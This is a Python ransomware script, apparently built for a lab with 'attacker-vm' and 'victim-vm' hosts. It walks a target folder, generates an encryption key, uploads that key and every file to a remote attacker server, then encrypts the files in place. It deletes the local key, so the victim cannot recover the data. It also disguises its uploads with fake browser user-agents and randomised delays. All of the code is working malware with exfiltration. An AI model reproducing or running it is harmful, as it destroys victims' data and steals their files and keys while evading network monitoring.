import os
from cryptography.fernet import Fernet
import argparse
import requests
import random
import time


# Configuration
SERVER_URL = "http://10.10.20.3:8080" #IP of attacker-vm
UPLOAD_ENDPOINT = "/status"
SLEEP_INTERVAL = 2     #Sleep in seconds


#ID for this agent
AGENT_ID = "victim-vm"

# Fake user-agents to blend into normal traffic
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
]

def encrypt(target_path = ""):

    # Normalize and verify folder
    target_path = os.path.abspath(target_path)

    if not os.path.isdir(target_path):
        raise ValueError(f"Target path does not exist or is not a directory: {target_path}")

    files = []

    # Collect all files in the directory path except specific ones
    for file in os.listdir(target_path):
        if file == "ransomware.py" or file == "secretkey.key":
            continue
        if os.path.isfile(os.path.join(target_path, file)):
            files.append(os.path.join(target_path, file))

    # Generate a key and save it to a file
    key = Fernet.generate_key()
    key_path = os.path.join(target_path, 'secretkey.key')
    with open(key_path,'wb') as thekey:
        thekey.write(key)
    exfil_data(key_path)
    #Remove file from victim
    os.remove(key_path)

    # Encrypt each file using the generated key
    for file in files:
        exfil_data(file)
        with open(file, 'rb') as thefile:
            print(f"Encrypting file: {file}")
            contents = thefile.read()
        encrypted_content = Fernet(key).encrypt(contents)
        with open(file, 'wb') as thefile:
            thefile.write(encrypted_content)
    print("All your files have been encrypted!")

def exfil_data(file):
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    payload = {"id": AGENT_ID}

    #Send file
    try:
        with open(file, "rb") as f:
            files = {"file": f}
            response = requests.post(
                SERVER_URL + UPLOAD_ENDPOINT,
                files=files,
                data=payload,
                headers=headers,
                timeout=5
            )

            #Eccezione per HTTP 4xx / 5xx
            response.raise_for_status()

    except requests.exceptions.RequestException as e:
        print(f"[ERROR] POST failed: {e}")

    except Exception as e:
        print(f"[ERROR] Unexpected error: {e}")

    #Wait between requests
    finally:
        sleep_time = random.uniform(
            SLEEP_INTERVAL * 0.8,
            SLEEP_INTERVAL * 1.2
        )
        time.sleep(sleep_time)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Encrypt files")
    parser.add_argument("--target", type=str, default="", help="Target folder")
    args = parser.parse_args()
    encrypt(args.target)